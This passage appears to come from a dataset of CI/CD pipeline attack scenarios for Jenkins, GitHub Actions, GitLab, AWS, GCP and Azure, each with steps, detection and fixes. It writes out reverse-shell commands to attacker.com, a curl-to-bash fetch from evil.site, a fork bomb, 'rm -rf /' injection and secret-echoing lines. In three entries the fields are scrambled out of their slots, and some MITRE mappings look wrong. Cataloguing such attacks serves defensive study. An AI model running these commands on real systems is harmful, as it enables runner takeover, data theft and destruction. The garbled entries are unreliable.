- **Detection**: DNS analysis, memory snapshot of runner
- **Solution**: Restrict unknown scripts, limit outbound connections
- **Tags**: #c2agent #jenkinsrunner #rc4shell

## GitLab CI Compiled Backdoor Delivered via Cache Injection

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitLab CI
- **Vulnerability**: Cache poisoning and unverified binary reuse
- **MITRE**: T1600
- **Impact**: Compromised production build binary
- **Tools**: GitLab CI, GCC, ccache
- **Scenario**: Attacker poisons CI build cache with compiled binary backdoor
- **Attack Steps**: 1. Contributor alters binary source file to include backdoor behavior.2. After build, ccache stores the compiled artifact.3. Next pipeline reuses this cache without revalidation, linking the poisoned object into release binary.4. The backdoor sends heartbeat to external host on magic packet.5. Incident triggers when external firewall logs show consistent outbound traffic at job deploy time.6. Binary diffing confirms injected code segment not part of source tree.7. Cache is flushed, and cache policy now includes commit hash scoping.8. Reproducible builds enforced using secure hashes and isolated environments.
- **Detection**: Binary checksum validation, anomaly detection
- **Solution**: Sign build artifacts, avoid shared cache reuse
- **Tags**: #buildpoison #gitlabcache #ciinjection

## GitHub Action Encodes Environment Variables and Sends to Webhook

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitHub Actions
- **Vulnerability**: Silent full-environment exfil via HTTP
- **MITRE**: T1041
- **Impact**: Complete credential compromise from CI job
- **Tools**: GitHub Actions, base64, curl
- **Scenario**: Environment stolen by encoding all variables and exfiltrating over HTTP
- **Attack Steps**: 1. CI job step reads environment with env, encodes with base64, and posts it to attacker-controlled endpoint using curl.2. This action is placed inside a modified workflow triggered by PR with pull_request_target.3. All secrets including GitHub tokens, API keys, DB creds, etc. are leaked.4. Attacker uses secrets to access production DBs, pipelines, and repositories.5. Blue team finds the base64 line in job logs and traces the HTTP destination.6. IP block is issued and webhooks are rotated.7. Audit trail reveals this was the only leak point.8. CI jobs are hardened with network egress deny rules.
- **Detection**: Job output review, DNS/HTTP firewall rules
- **Solution**: Egress firewall, disable untrusted PR execution
- **Tags**: #envleak #githubworkflow #base64curl

## Git Hook Triggers CI Wipe via Jenkins Poll Job

- **Attack Type**: Unrestricted Script Execution
- **Target**: Jenkins
- **Vulnerability**: Remote destructive command via SCM hook
- **MITRE**: T1490
- **Impact**: CI data loss, job state destruction
- **Tools**: Jenkins, Bash
- **Scenario**: Git hook runs rm -rf and wipes Jenkins CI home directory
- **Attack Steps**: 1. A pushed Git commit contains malicious .git/hooks/post-receive.2. Jenkins is configured to execute repo hooks during polling.3. The hook wipes important Jenkins directories and loads a script from attacker’s server.4. All job configs, history, secrets are deleted.5. No backups were taken in 48 hours, leading to significant loss.6. Blue team rebuilds Jenkins and disables hook execution from repo during SCM polling.7. CI templates now reject .git/hooks inclusion during code review.8. Build script scanner is implemented to warn of destructive commands.
- **Detection**: File integrity monitoring, command execution review
- **Solution**: Disable hooks, scan repos for malicious .git/hooks
- **Tags**: #jenkinshook #cidestruction #postreceive

## External Repo Clone Introduces Backdoored Init Script

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitHub Actions
- **Vulnerability**: Supply-chain injection via repo clone
- **MITRE**: T1195.002
- **Impact**: Lateral repo compromise through shared tooling
- **Tools**: GitHub Actions, Bash, init.sh
- **Scenario**: Repo clones unverified source with malicious install script
- **Attack Steps**: 1. CI job clones an external repo using git clone with no hash check.2. Repo has been typosquatted and now includes a modified init.sh.3. Script adds attacker SSH key to CI runner and uploads .ssh and .bash_history to external host.4. Job completes successfully, masking malicious steps under innocuous build messages.5. Several other repos reuse same dependency chain.6. Security team flags this during dependency audit.7. CI jobs now verify SHA and GPG signature of external repos.8. Allowlist added to prevent clone from unknown GitHub repos.
- **Detection**: SHA/GPG signature validation, clone activity logs
- **Solution**: Restrict external clones to vetted dependencies
- **Tags**: #supplychain #repoabuse #initbackdoor

## GitLab Job Accidentally Logs GCP Token in Clear Text

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitLab CI
- **Vulnerability**: Accidental log leak of secret token
- **MITRE**: T1552.001
- **Impact**: GCP environment compromise and cost surge
- **Tools**: GitLab CI, GCP
- **Scenario**: A developer logs $GCP_TOKEN in pipeline debug log by mistake
- **Attack Steps**: 1. Developer adds echo "GCP_TOKEN=$GCP_TOKEN" in a job to troubleshoot secret injection.2. GitLab logs show this value in plain text because no redaction was applied.3. Token is indexed by GitLab's public job log index.4. Within 30 minutes, attacker launches multiple VMs for mining, exhausting quota.5. Alert is raised via GCP monitoring on billing and quota spikes.6. Logs are manually purged, IAM token revoked, and incident documented.7. GitLab pipeline security rules are enhanced to block echoing of secret vars.8. Static secret scanner is used to detect high-entropy values in logs.
- **Detection**: Billing anomaly, GitLab audit logs
- **Solution**: Use variable masking, disable echo of secrets
- **Tags**: #gcpkeyleak #gitlabpipeline #logexposure

## GitHub Workflow Poisoning via jobs.deploy.steps[*].run

- **Attack Type**: Pipeline Poisoning
- **Target**: GitHub Actions
- **Vulnerability**: Inadequate validation of CI configuration
- **MITRE**: T1609
- **Impact**: Resource abuse, unauthorized CI task execution
- **Tools**: GitHub Actions, Bash
- **Scenario**: Attacker commits a poisoned .github/workflows/deploy.yml that runs malicious code during release
- **Attack Steps**: 1. Attacker submits a PR containing a modified deploy.yml workflow file.2. Inside jobs.deploy.steps[*].run, a hidden malicious command is injected using string concatenation and line breaks.3. When the PR is merged, the CI job executes the malicious payload which downloads and runs a crypto miner.4. The miner process is disguised under a legitimate name and runs with low CPU priority.5. GitHub-hosted runner consumes excess CPU over time.6. SOC team detects anomaly after billing alert shows high runner time.7. GitHub logs reviewed and offending YAML is traced.8. Org implements policy to restrict write access to workflow files and sets PR approval on CI config changes.
- **Detection**: GitHub audit logs, CPU usage monitoring
- **Solution**: Enforce workflow change approvals, enable CI config linting
- **Tags**: #githubci #yamlpoisoning #cryptomining

## GitLab .gitlab-ci.yml Poisoned with Reverse Shell Payload

- **Attack Type**: Pipeline Poisoning
- **Target**: GitLab CI
- **Vulnerability**: No validation of custom CI job definitions
- **MITRE**: T1059.004
- **Impact**: Full CI runner compromise and lateral movement
- **Tools**: GitLab CI, Bash, netcat
- **Scenario**: Malicious user adds reverse shell in pipeline job definition targeting self-hosted runner
- **Attack Steps**: 1. Attacker adds a new job in .gitlab-ci.yml named diagnostics containing nc attacker.com 4444 -e /bin/bash.2. GitLab CI executes this job on a self-hosted runner after PR approval.3. Reverse shell opens, granting attacker remote access.4. Attacker browses environment variables, SSH configs, and deployment keys.5. The runner environment is scanned for reachable internal assets.6. Long-running shell is detected after netstat reveals suspicious active connections.7. Blue team revokes compromised credentials and disables affected runner.8. CI jobs are restricted with allowlisted YAML templates and alerting on nc or curl patterns.
- **Detection**: Runner network monitoring, unusual job names
- **Solution**: Enforce template-based jobs, restrict YAML edit rights
- **Tags**: #gitlabci #reverseshell #runnerabuse

## Jenkins Pipeline Injected with Base64 Dropper

- **Attack Type**: Pipeline Poisoning
- **Target**: Jenkins
- **Vulnerability**: Executing encoded payloads from pipeline
- **MITRE**: T1027
- **Impact**: Credential theft and persistent access
- **Tools**: Jenkins, Bash
- **Scenario**: A base64-encoded dropper is injected into a Jenkins scripted pipeline
- **Attack Steps**: 1. Malicious user modifies Jenkinsfile to include a line that decodes a base64 payload and executes it using eval.2. The payload silently installs a backdoor and exfiltrates secrets from ~/.jenkins/secrets/.3. Job executes under Jenkins user and has access to credential stores.4. The dropper disguises itself as a dependency fetch script.5. SOC discovers the attack after detecting frequent POST requests to a rare IP.6. Memory dump of Jenkins runner reveals persistent shell.7. Jenkins is rebuilt and restricted to approved pipelines.8. Base64 usage in pipeline scripts is flagged and scanned by security jobs.
- **Detection**: IDS, Jenkins logs, base64 pattern scanning
- **Solution**: Use signed Jenkinsfiles, flag encoded command blocks
- **Tags**: #jenkins #pipelineabuse #base64attack

## Poisoned .github/workflows/test.yml Leaks GCP Credentials

- **Attack Type**: Pipeline Poisoning
- **Target**: GitHub Actions
- **Vulnerability**: Exposed secret in CI log due to poisoning
- **MITRE**: T1552.001
- **Impact**: Credential leak and cloud abuse
- **Tools**: GitHub Actions, GCP
- **Scenario**: An exposed workflow logs $GCP_TOKEN accidentally, allowing external theft
- **Attack Steps**: 1. Contributor submits a PR with a modified test workflow that includes echo $GCP_TOKEN for debug.2. GitHub Actions runner prints the token in job logs which are public.3. Within minutes, bots scrape the logs and use token to spin up GCP VMs for crypto mining.4. Alert triggered via GCP billing API, team investigates logs.5. Audit shows CI configuration change was merged without review.6. Credentials rotated, logs scrubbed, and pipelines updated to auto-mask secrets.7. GitHub team implements pre-commit hooks to detect echoing secrets.8. CI templates restrict access to environment variables without approval.
- **Detection**: GCP billing anomalies, GitHub PR audit trail
- **Solution**: Enforce secret masking, restrict PR workflow execution
- **Tags**: #secretleak #gcp #workflowpoisoning

## YAML Condition Misuse to Bypass Approval Gates

- **Attack Type**: Pipeline Poisoning
- **Target**: GitHub Actions
- **Vulnerability**: Bypass logic for unintended execution
- **MITRE**: T1609
- **Impact**: Unauthorized code execution in CI
- **Tools**: GitHub Actions
- **Scenario**: Misusing YAML conditions to execute malicious stage when if: always() condition is triggered
- **Attack Steps**: 1. Attacker modifies YAML to add an extra job with if: always() that runs even on failure or canceled jobs.2. This job installs curl, downloads a script from attacker's server, and executes it.3. Script steals GitHub token and sends it to a webhook.4. Since the job is under a misleading name like cleanup, it gets overlooked.5. Alert is raised only after anomalous login is detected on GitHub.6. Team traces back to previous CI job logs and finds the condition misused.7. Approval gates are fixed to prevent bypass.8. GitHub workflows are locked down using required reviewers on CI changes.
- **Detection**: GitHub audit log, webhook traffic monitoring
- **Solution**: Lock conditional steps, flag misuse of always() logic
- **Tags**: #ciabuse #yamlbypass #gitsecurity

## Jenkins Pipeline YAML Runs Suspicious Job from Artifact

- **Attack Type**: Pipeline Poisoning
- **Target**: Jenkins
- **Vulnerability**: Artifact abuse for executing hidden tools
- **MITRE**: T1204.002
- **Impact**: Covert deployment of malicious CI agent
- **Tools**: Jenkins, Bash
- **Scenario**: Jenkins pipeline YAML injects job that downloads and executes binary from build artifact
- **Attack Steps**: 1. A new pipeline job is injected that uses wget to fetch a precompiled binary from attacker’s artifact repo.2. The job is placed under test-tools to avoid attention.3. Binary installs persistent service and sends periodic pings to attacker's C2.4. The process runs hidden using nohup and a cronjob.5. SOC detects periodic DNS beacons from runner’s IP.6. Full job log inspection reveals artifact URL misuse.7. Runner is reset, and job definitions are changed to reject dynamic artifact downloads.8. Jenkins admins implement content hash validation for external binaries.
- **Detection**: DNS beacon detection, URL reputation filtering
- **Solution**: Validate artifact integrity, disallow external binary fetch
- **Tags**: #jenkins #artifactattack #cibeaconing

## .gitlab-ci.yml Poisoned with Typosquatted Dependency

- **Attack Type**: Pipeline Poisoning
- **Target**: GitLab CI
- **Vulnerability**: Typosquatted package injection
- **MITRE**: T1554
- **Impact**: Supply chain compromise via CI dependency
- **Tools**: GitLab CI, Python, pip
- **Scenario**: Poisoned CI file fetches a dependency from typo-named PyPI package
- **Attack Steps**: 1. Attacker changes pipeline script to install requests2 instead of requests.2. requests2 is attacker-controlled and runs setup.py which exfiltrates ENV variables and SSH keys.3. Job runs successfully since functionality is mimicked.4. Months pass before SOC detects consistent webhook calls from GitLab runner.5. Investigation reveals typo-squatted package and poisoned YAML config.6. Package is removed from PyPI and hashes updated in CI templates.7. Package allowlisting policy is implemented.8. Developers are trained to validate third-party package names carefully.
- **Detection**: Dependency checkers, outbound request logs
- **Solution**: Package allowlists, CI scanner for typo-names
- **Tags**: #typosquat #pipattack #ciinjection

## YAML Shell Substitution Triggers eval of User Input

- **Attack Type**: Pipeline Poisoning
- **Target**: GitHub Actions
- **Vulnerability**: Dangerous shell injection via eval
- **MITRE**: T1059
- **Impact**: Full runner compromise and secret exfiltration
- **Tools**: GitHub Actions
- **Scenario**: Injected YAML runs eval $INPUT_SCRIPT which allows arbitrary shell execution from env variable
- **Attack Steps**: 1. CI config is modified to include run: eval $USER_INPUT_SCRIPT.2. Attacker sets USER_INPUT_SCRIPT to a malicious command in environment or secret variable.3. CI runner executes full command under system shell.4. Malicious job exfiltrates SSH keys and deploy tokens.5. This happens during build phase of otherwise legitimate pipeline.6. SOC finds unexpected bash history in logs and investigates eval usage.7. CI is updated to restrict eval and use explicit command strings.8. Variables are scanned for shell commands before job execution.
- **Detection**: Variable sanitizer, CI job command audit
- **Solution**: Remove use of eval, enforce static command usage
- **Tags**: #shellinjection #yampipeline #evalabuse

## Jenkins Groovy Script Runs Malicious Payload via YAML Job

- **Attack Type**: Pipeline Poisoning
- **Target**: Jenkins
- **Vulnerability**: Remote class execution via CI config
- **MITRE**: T1055.002
- **Impact**: Remote runner takeover and persistent agent
- **Tools**: Jenkins, Groovy, JAR
- **Scenario**: YAML job calls a Groovy script block that downloads and executes remote JAR
- **Attack Steps**: 1. Attacker modifies a Jenkins YAML job to embed Groovy code using script block.2. The code downloads a remote malicious JAR and loads it using Groovy's URLClassLoader.3. The JAR runs a reverse shell agent and drops itself in /tmp as hidden file.4. Communication begins with attacker's server over SSL tunnel.5. Logs show external fetch but disguise nature of JAR file.6. Blue team notices unusual Groovy script execution in a basic build job.7. Jenkins is updated to disable inline Groovy support in jobs.8. Artifact signature validation is added for external jars.
- **Detection**: Groovy execution logs, SSL traffic inspection
- **Solution**: Disable Groovy in YAML jobs, enforce job integrity checks
- **Tags**: #groovyexploit #jenkinsci #yamlinjection

## .github/workflows/test.yml Encodes Secrets via XOR Cipher

- **Attack Type**: Pipeline Poisoning
- **Target**: GitHub Actions
- **Vulnerability**: Obfuscation of secrets in job artifacts
- **MITRE**: T1140
- **Impact**: Credential theft via encoded artifact dump
- **Tools**: GitHub Actions, Python
- **Scenario**: CI job uses simple XOR obfuscation to leak secrets during build
- **Attack Steps**: 1. Workflow file is modified to include Python script that reads all secrets and XORs them with a static key.2. Obfuscated secrets are saved in build artifact file.3. Attacker downloads artifact from GitHub Actions interface.4. Decodes the secrets offline using known XOR key.5. Secrets include database credentials, SMTP password, and signing tokens.6. Blue team identifies suspicious artifact after anomaly in webhook behavior.7. XOR pattern is detected in job logs through entropy analysis.8. Artifacts are now scanned for high-entropy or encoded content before download.
- **Detection**: Artifact review, XOR/entropy pattern detection
- **Solution**: Scan artifacts, use hash-matching & approval for downloads
- **Tags**: #ciobfuscation #xorsecret #pipelineleak

## Jenkinsfile Reverse Shell via PR

- **Attack Type**: CI Workflow RCE via PR Injection
- **Target**: Jenkins
- **Vulnerability**: PR auto-trigger on untrusted YAML changes
- **MITRE**: T1059.004
- **Impact**: Remote shell access, environment compromise
- **Tools**: Jenkins, netcat
- **Scenario**: Malicious PR injects reverse shell command into Jenkins pipeline script
- **Attack Steps**: 1. Attacker forks a repository and crafts a malicious PR including a Jenkinsfile with a reverse shell.2. The script contains nc attacker-ip 4444 -e /bin/bash, hidden among other legitimate-looking build steps.3. CI pipeline auto-triggers the PR without reviewer intervention due to misconfigured webhook trust settings.4. The runner executes the injected shell, initiating a connection to the attacker's machine.5. The attacker gains interactive control of the Jenkins runner, explores environment secrets, and pivots to other assets.6. Alert is triggered only after firewall logs detect unauthorized outgoing traffic.7. SOC disables PR auto-triggers and updates Jenkins to use secure pipeline libraries only.8. Network egress filters are introduced for CI runner VMs.
- **Detection**: Netflow logs, egress monitoring
- **Solution**: Disable PR-triggered jobs, isolate CI runners
- **Tags**: #jenkins #rce #ciinjection

## GitHub Actions Job Named doc-builder Runs Obfuscated Malware

- **Attack Type**: Malicious Job Masking (Obfuscation)
- **Target**: base64 -d)"`.3. On decoding, the script installs a keylogger in the runner environment.4. The obfuscation hides true intent from code reviewers.5. Keylogs are sent to attacker's webhook URL.6. GitHub logs show execution but do not flag obfuscated strings.7. Blue team detects anomalous POST traffic and matches with suspicious job history.8. All CI scripts with encoded payloads are now disallowed via pre-commit linting.
- **Vulnerability**: GitHub Actions
- **MITRE**: Job name manipulation and script obfuscation
- **Impact**: T1027
- **Tools**: GitHub Actions, Bash
- **Scenario**: Legit-looking job with misleading name runs malware via obfuscated shell script
- **Attack Steps**: 1. A PR adds a new job in doc-builder.yml, appearing to improve documentation automation.2. The job contains a base64-encoded script that runs using `bash -c "$(echo ZWNobyAnSGFja2VkJw==
- **Detection**: Data theft, long-term keylog persistence
- **Solution**: HTTP logs, base64 pattern detection
- **Tags**: Obfuscation detection, job naming policies

## GitLab Job Downloads Remote ZIP with Trojan

- **Attack Type**: Remote File Execution via CI Pipeline
- **Target**: GitLab CI
- **Vulnerability**: Lack of restrictions on remote downloads
- **MITRE**: T1105
- **Impact**: CI runner takeover and persistent backdoor
- **Tools**: GitLab CI, wget, unzip
- **Scenario**: A job in .gitlab-ci.yml downloads and unzips malicious payload before execution
- **Attack Steps**: 1. The attacker inserts a new CI job that downloads https://malicious.site/evil.zip.2. The ZIP contains a script disguised as a setup.sh, which includes commands to install a backdoor.3. During the build phase, the file is extracted and silently executed.4. Runner system is altered, and a backconnect service is started.5. External monitoring detects beaconing behavior every 30 seconds.6. GitLab logs point to the offending .gitlab-ci.yml change.7. Pipeline jobs are reviewed and updated to disallow wget from external domains.8. GitLab templates are enforced using signed CI job templates.
- **Detection**: Domain/IP reputation, CI config review
- **Solution**: Restrict network in CI, use allowlist for URLs
- **Tags**: #gitlab #remotedownload #pipelinebackdoor

## Jenkinsfile with Hidden Crypto-Miner Execution

- **Attack Type**: Resource Abuse via Hidden Jobs
- **Target**: Jenkins
- **Vulnerability**: Misuse of build job permissions
- **MITRE**: T1496
- **Impact**: Resource exhaustion and billing abuse
- **Tools**: Jenkins, xmrig
- **Scenario**: Mining software is installed and executed in a hidden job labeled as system check
- **Attack Steps**: 1. Malicious user modifies Jenkinsfile with a job titled SystemCheck that installs xmrig miner.2. Script fetches miner binary from GitHub raw link and starts background process with low priority.3. Miner is disguised under update-checker process name.4. Jenkins runner shows 90% CPU utilization consistently.5. Admin notices delayed builds and investigates system logs.6. Process list reveals unexpected binaries.7. The Jenkinsfile is rolled back, compromised credentials are rotated.8. CI usage is limited to containers, and CPU spikes are alerted in real-time.
- **Detection**: Runner CPU metrics, system process audit
- **Solution**: Containerize builds, monitor for CPU anomalies
- **Tags**: #cryptomining #jenkinsmisuse #resourceabuse

## GitHub Workflow Leaks AWS Key via Echo

- **Attack Type**: Secret Exposure via CI Misconfiguration
- **Target**: GitHub Actions
- **Vulnerability**: Failure to mask sensitive output
- **MITRE**: T1552.001
- **Impact**: Cloud abuse and billing fraud
- **Tools**: GitHub Actions, AWS CLI
- **Scenario**: Secret variable is logged due to echoing in build phase
- **Attack Steps**: 1. Developer adds echo $AWS_SECRET_ACCESS_KEY in workflow for debugging.2. GitHub logs the output publicly as part of Actions job.3. Bot scrapes GitHub Actions logs within minutes, finds the leaked key.4. Using stolen AWS key, attacker launches EC2 instances and performs crypto mining.5. AWS GuardDuty alerts on anomalous resource usage.6. Key is rotated and GitHub secret masking is enforced.7. Review policies updated to prohibit echo $SECRET_* in any CI config.8. Scripts with echo statements now trigger security job scan.
- **Detection**: AWS GuardDuty, GitHub job output scan
- **Solution**: Enforce masking, prohibit echoing sensitive vars
- **Tags**: #secretleak #githubactions #awscompromise

## Jenkins Plugin Downloads Malicious Dependency

- **Attack Type**: Supply Chain Injection in CI Plugins
- **Target**: Jenkins
- **Vulnerability**: Dependency hijack via plugin misuse
- **MITRE**: T1195.002
- **Impact**: Supply chain compromise, internal scanning
- **Tools**: Jenkins, custom plugin, Maven
- **Scenario**: Compromised Jenkins plugin fetches malicious library on CI job start
- **Attack Steps**: 1. Jenkins job uses third-party plugin that references Maven package by short name.2. Attacker publishes a malicious package to Maven Central using same short name.3. During build, the plugin downloads and executes attacker’s library.4. The library opens a port and listens for remote commands.5. Jenkins node is used to scan internal subnets for lateral movement.6. Alert triggered by unusual port listening on build server.7. Dependency tree is traced and plugin is found compromised.8. Jenkins plugins are locked to hash-verified versions only.
- **Detection**: Port scan detection, dependency resolver logs
- **Solution**: Hash-validate plugins, lock dependencies
- **Tags**: #jenkins #pluginattack #supplychain

## GitHub Workflow Poisoned Using Logic Bomb

- **Attack Type**: CI Logic Bomb Execution
- **Target**: GitHub Actions
- **Vulnerability**: Time-based condition abuse in CI logic
- **MITRE**: T1609
- **Impact**: Targeted secret exfiltration via CI logic bomb
- **Tools**: GitHub Actions, Python
- **Scenario**: A conditional logic trick causes malicious script to run only on specific time/date
- **Attack Steps**: 1. Attacker introduces logic in workflow: if: github.event.head_commit.timestamp == "Friday".2. Script that follows only runs rm -rf /tmp/secret and exfiltrates files.3. Logic passes unnoticed during code review due to obscure condition.4. On Friday, the pipeline triggers and silently dumps environment files to attacker’s server.5. Logs are cleaned within the workflow itself using > /dev/null 2>&1.6. Team detects loss of critical temp files and traces anomaly to job behavior.7. Conditional logic in YAML is now flagged by review system.8. Secure job templating is enforced with rule-based conditions.
- **Detection**: Job behavior anomaly, time-based job diff
- **Solution**: Disallow custom conditions without approvals
- **Tags**: #logicbomb #ciworkflow #yamltrap

## GitLab CI Injects Bash Fork Bomb

- **Attack Type**: Denial of Service via Build Abuse
- **Target**: :& };:into.gitlab-ci.yml, masked under a cleanupjob.<br>2. The command triggers exponential process forking, exhausting system memory.<br>3. Runner crashes within seconds, halting all concurrent builds.<br>4. SOC sees system alerts and kernel panic logs.<br>5..gitlab-ci.yml` revision shows malicious change.6. The repo is quarantined, and user access revoked.7. GitLab jobs now pass through resource quota guards.8. Process limit cgroups are enabled for runner security.
- **Vulnerability**: GitLab CI
- **MITRE**: Unrestricted shell access in build phase
- **Impact**: T1499.001
- **Tools**: GitLab CI, Bash
- **Scenario**: CI job executes a fork bomb to crash self-hosted runner
- **Attack Steps**: 1. User inserts `:(){ :
- **Detection**: CI system crash and build queue failure
- **Solution**: System resource monitor, runner logs
- **Tags**: Limit shell commands, enforce cgroup isolation

## YAML Injection via Environment Variable in Jenkinsfile

- **Attack Type**: CI Config Injection via Unescaped Vars
- **Target**: Jenkins
- **Vulnerability**: Improper variable sanitization
- **MITRE**: T1190
- **Impact**: Destructive job injection through variable misuse
- **Tools**: Jenkins, Bash
- **Scenario**: Variable passed in Jenkinsfile breaks YAML syntax and injects unintended job commands
- **Attack Steps**: 1. Jenkinsfile references unescaped $ENV_JOB_CONFIG, which attacker sets to build:\n - rm -rf /.2. The YAML parser interprets it as a nested new job that deletes runner directory.3. Job executes and causes runner to crash.4. Jenkins does not validate YAML structure before parsing variable.5. Blue team inspects audit logs and realizes variable overwrote job definition.6. Jenkinsfiles are locked to only read pre-defined environment keys.7. Job syntax is validated using custom linter plugin.8. Injection attempts are now flagged during pre-merge hooks.
- **Detection**: YAML validation, environment key audit
- **Solution**: Sanitize inputs, validate structure of injected values
- **Tags**: #yamlinjection #jenkinsbug #ciinjection

## GitHub Secrets Passed to External Script Silently

- **Attack Type**: Secret Abuse in External Execution
- **Target**: bash, and passes secrets as arguments.<br>2. The attacker-hosted script logs secrets to a remote server.<br>3. No visibility is provided in GitHub logs as secrets are passed as flags like --token $SECRET.<br>4. Blue team finds usage spike of the token in cloud logs.<br>5. The workflow was previously approved assuming script.sh` was harmless.6. Policy is created to ban external script calls without code review.7. Secrets are rotated and audit trail shared with security team.8. Static CI analysis is implemented to detect unsafe curl-pipe-bash patterns.
- **Vulnerability**: GitHub Actions
- **MITRE**: Blind secret sharing with external script
- **Impact**: T1557
- **Tools**: GitHub Actions, Bash
- **Scenario**: Secrets passed to an external script that silently logs and transmits them
- **Attack Steps**: 1. Workflow job runs `curl https://evil.site/script.sh
- **Detection**: Secret theft without detection
- **Solution**: Cloud logs, curl/cmd usage analysis
- **Tags**: Disallow external scripts, scan for unsafe command chains

## GCP Cloud Build with Owner Role Allows Project Takeover

- **Attack Type**: Overprivileged GCP IAM Role
- **Target**: GCP
- **Vulnerability**: Misconfigured IAM Role (Owner)
- **MITRE**: T1078.004
- **Impact**: Total GCP resource compromise and stealthy persistence
- **Tools**: GCP Cloud Build, gcloud CLI, IAM
- **Scenario**: A Cloud Build service account is accidentally granted the Owner role on the GCP project, allowing an attacker to compromise the entire infrastructure post-CI access.
- **Attack Steps**: 1. A junior DevOps engineer configures a Cloud Build trigger in GCP that automatically deploys code to App Engine. 2. To avoid permission issues during early testing, they assign the Cloud Build service account the roles/owner, giving it unrestricted access to all project-level resources. 3. The service account’s key is stored in plaintext as a GitHub Actions secret. 4. An attacker gains access to the GitHub repo via a compromised contributor account. 5. They modify a pull request to include a step that prints ${{ secrets.GCP_SA_KEY }} to the build log. 6. Once the workflow runs, the attacker scrapes the exposed key from GitHub’s logs. 7. They then authenticate using gcloud auth activate-service-account with the stolen key. 8. With Owner privileges, the attacker spins up Compute Engine instances, disables Cloud Logging, adds new IAM users, and sets up a storage bucket for data exfiltration. 9. Persistence is established through hidden startup scripts and logging is completely disabled to avoid alerts.
- **Detection**: IAM audit logs, service account usage anomalies
- **Solution**: Use least privilege roles like Cloud Build Editor or scoped roles/cloudbuild.builds.editor
- **Tags**: #gcp #cloudbuild #iammisconfig

## AWS CodeBuild Job Runs with Admin Access, Enables RCE

- **Attack Type**: Broad IAM Permissions in CodeBuild
- **Target**: AWS
- **Vulnerability**: Admin Role Exposure in CI
- **MITRE**: T1106
- **Impact**: Remote execution and IAM abuse in AWS
- **Tools**: AWS CodeBuild, AWS CLI, CloudTrail
- **Scenario**: AWS CodeBuild role with full AdministratorAccess allows an attacker to execute arbitrary AWS CLI commands and establish long-term cloud persistence.
- **Attack Steps**: 1. An organization sets up an AWS CodeBuild job for automated deployments, granting it AdministratorAccess for simplicity. 2. A contributor submits a pull request modifying buildspec.yml to include a curl command to download and run a remote shell script. 3. This buildspec runs automatically in CodeBuild on every pull request merge without review. 4. The attacker’s shell script executes aws iam create-user, followed by aws iam attach-user-policy to give that new user the same admin rights. 5. To maintain persistence, attacker stores AWS credentials of this new user in an external GitHub Gist via the build job. 6. Additionally, a scheduled Lambda is deployed to reinstate permissions if revoked. 7. No MFA is enforced, and session policies are missing, allowing indefinite access. 8. The attack is only discovered weeks later after abnormal billing spikes.
- **Detection**: CloudTrail IAM API calls, Lambda creation events
- **Solution**: Assign scoped IAM roles, validate buildspec.yml, block unreviewed PRs
- **Tags**: #aws #codebuild #ciinjection

## GitHub Actions Leaks GCP Editor Role Through Pull Request

- **Attack Type**: Secret Misuse in GitHub CI
- **Target**: GCP
- **Vulnerability**: Overpermissive service account exposed via CI
- **MITRE**: T1552.001
- **Impact**: Full cloud environment compromise
- **Tools**: GitHub Actions, GCP CLI
- **Scenario**: GitHub Actions workflow grants secrets.GCP_JSON tied to an Editor-privileged GCP account. A malicious pull request prints the key to logs and enables infrastructure compromise.
- **Attack Steps**: 1. A GCP deployment pipeline uses GitHub Actions with a service account stored in GCP_JSON GitHub secret. 2. This account has the Editor role, meaning it can modify Compute, Storage, IAM settings, etc. 3. Attacker forks the repo and submits a PR that executes echo ${{ secrets.GCP_JSON }} to a temporary file and uploads it to an external FTP server. 4. The PR triggers a workflow via pull_request_target, which runs in the context of the base repository and has access to secrets. 5. The attacker downloads the JSON key and activates it using gcloud auth activate-service-account. 6. They then create a GCE instance, modify bucket permissions, and turn off audit logging. 7. They store credentials for persistence in a new Firestore record.
- **Detection**: PR logs, FTP outbound alert, IAM key creation events
- **Solution**: Use read-only accounts, disable secret access on pull_request_target events
- **Tags**: #github #gcp #serviceaccount

## Azure DevOps Pipeline Grants Contributor Access, Enabling Hidden VMs

- **Attack Type**: Overprovisioned Azure Role
- **Target**: Azure
- **Vulnerability**: Insecure Contributor Role Use
- **MITRE**: T1059.004
- **Impact**: Cloud VM exploitation and hidden infrastructure
- **Tools**: Azure DevOps, Azure CLI
- **Scenario**: A pipeline's service connection grants Contributor role over an entire Azure subscription, allowing attackers to spawn hidden virtual machines post-PR.
- **Attack Steps**: 1. Azure DevOps uses a service connection tied to a Service Principal with Contributor access over the full subscription. 2. This service connection is used in YAML pipelines without any approval process. 3. Attacker submits a PR that silently adds a job with az vm create pointing to a custom image that contains preloaded malware. 4. The VM is created in a hidden resource group and its network security group allows outbound access only. 5. After creation, the pipeline deletes the audit logs and disables logging using az monitor log-profiles delete. 6. The attacker uses the deployed VM to host a reverse proxy and gather internal telemetry.
- **Detection**: Resource group changes, NSG traffic logs
- **Solution**: Require RBAC scoping, pipeline approvals
- **Tags**: #azure #devops #cloudinjection

## GitLab Runner With Full GCP IAM Allows Cross-Project Exfiltration

- **Attack Type**: Full IAM Binding via GitLab CI
- **Target**: GCP
- **Vulnerability**: Shared IAM account between CI scopes
- **MITRE**: T1110.003
- **Impact**: Cross-project resource abuse
- **Tools**: GitLab CI, GCP, gsutil
- **Scenario**: GitLab CI runner authenticates to GCP with a high-privilege service account, allowing lateral movement and sensitive data access post-compromise.
- **Attack Steps**: 1. A GitLab pipeline uses a self-hosted runner and authenticates with a service account having access to multiple GCP projects. 2. Secrets are injected via environment variables and the service account is assigned roles/editor across projects. 3. Attacker compromises the runner via malicious dependency. 4. They extract credentials from environment variables and access Project B from a build running in Project A. 5. They enumerate Cloud Storage buckets, download GCF secrets, and deploy a malware-laden function in another project. 6. The attacker deletes logs in Project A to prevent cross-project traceability.
- **Detection**: Cross-project activity detection in Logs Explorer
- **Solution**: Use one-service-account-per-project design
- **Tags**: #gitlab #gcp #ciisolation

## AWS Role Assumed Without Condition Restrictions

- **Attack Type**: Missing Role Trust Conditions
- **Target**: AWS
- **Vulnerability**: Trust policy too loose
- **MITRE**: T1078.004
- **Impact**: Unauthorized AWS role assumption
- **Tools**: AWS STS, GitHub Actions
- **Scenario**: An attacker reuses a leaked GitHub Actions token to assume an AWS IAM role that lacked proper Condition constraints, enabling unauthorized API calls.
